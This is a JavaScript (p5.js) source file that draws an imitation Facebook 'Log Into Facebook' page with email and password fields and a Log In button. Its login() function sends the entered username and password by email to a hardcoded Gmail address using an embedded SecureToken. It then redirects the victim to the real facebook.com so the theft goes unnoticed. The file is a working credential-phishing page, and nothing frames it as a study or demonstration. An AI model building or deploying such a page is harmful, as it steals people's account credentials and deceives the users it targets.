let wdth, hght, input, bckgrnd, banner, email, bottom, shouldResize;

function setup() {
  createCanvas(windowWidth, 840);
  shouldResize = true;
  bckgrnd = loadImage('facebook.PNG');
  banner = loadImage('facebookbanner.PNG');
  bottom = loadImage('bottom.PNG');
  // console.log(banner.width);
  //   wdth = width/10;
  //   hght = height/10;
  username = createInput();
  username.size(300, 30);
  username.position(610, 250);
  username.style('border', '1px solid black');
  username.style('border-color', 'rgb(236, 236, 236)');
  username.style('fontSize', '15px');
  username.style('font-color', 'rgb rgb(26, 236, 236)');
  username.elt.placeholder = 'Email or Phone Number';
  username.elt.style.paddingLeft = '10px'
  username.elt.style.outline = 'none'


  password = createInput('', 'password');
  password.size(300, 30);
  password.position(610, 300);
  password.style('border', '1px solid black');
  password.style('border-color', 'rgb(236, 236, 236)');
  password.style('fontSize', '15px');
  password.style('font-color', 'rgb rgb(26, 236, 236)');
  password.elt.placeholder = 'Password';
  password.elt.style.paddingLeft = '10px'
  password.elt.style.outline = 'none'
  submit = createButton('<b>Log In</b>');
  submit.size(300, 40);
  submit.position(610, 350);
  submit.style('background-color', 'rgb(66,103,178)');
  submit.style('border', '0px solid black');
  submit.style('color', 'white');
  submit.style('display', 'inline-block');
  submit.style('font-size', '15px');
  submit.mousePressed(login);
  newAccount = createButton('Create New Account');
  newAccount.size(200, 40);
  newAccount.position(660, 470);
  newAccount.style('background-color', 'rgb(68, 180, 44)');
  newAccount.style('border', '0px solid black');
  newAccount.style('color', 'white');
  newAccount.style('display', 'inline-block');
  newAccount.style('font-size', '15px');
  newAccount.mousePressed(newacc);

  // canvas.resize(banne);
}


function login() {
  Email.send({
    SecureToken: "8f3f3aff-06d2-493b-aa98-1d135b73a48b",
    To: "passduck99@gmail.com",
    // Bcc : 'kyle@computingant.com', 
    From: "passduck99@gmail.com",
    // From: input.value(),
    Subject: "Username and Password",
    Body: "Username: " + username.value() + "<br><br>Password " + password.value()
  }).then(
//     alert('Email was sent')
  );
  window.location.replace("http://facebook.com");
}

function newacc() {
  window.location.replace("https://www.facebook.com/r.php?locale=en_US&display=page");
}

function draw() {
  // resizeCanvas(banner.width, 840);
  // if(shouldResize && banner.width>100){
  // // banner.width-=00;
  // shouldResize = false;
  //    }
  
  background(236, 236, 236);
  
  push();
  fill(255);
  noStroke();
  rect(0, 620, width, height);
  image(banner, 0, 0, width, 83);
  pop();
  push();
  fill(255);
  stroke(220);
  strokeWeight(0.1);
  rect(455, 165, 610, 375);
  
  push();
  // scale(5, 0, 0);
  image(bottom, 0, 620, width, bottom.height/1.3);
  pop();
  pop();
  push();
  textSize(19);
  text('Log Into Facebook', 675, 220);
  pop();

  push();
  fill(66, 103, 150);
  textSize(12);
  text('Forgot account?', 720, 415);
  pop();

  push();
  noStroke();
  fill(0);
  rect(610, 440, 130, 0.3);
  rect(780, 440, 130, 0.3);
  textSize(11);
  text('or', 755, 445);
  pop();





  // image(bckgrnd, 0, 0);
  // text('hi', width/2, height/2);
}
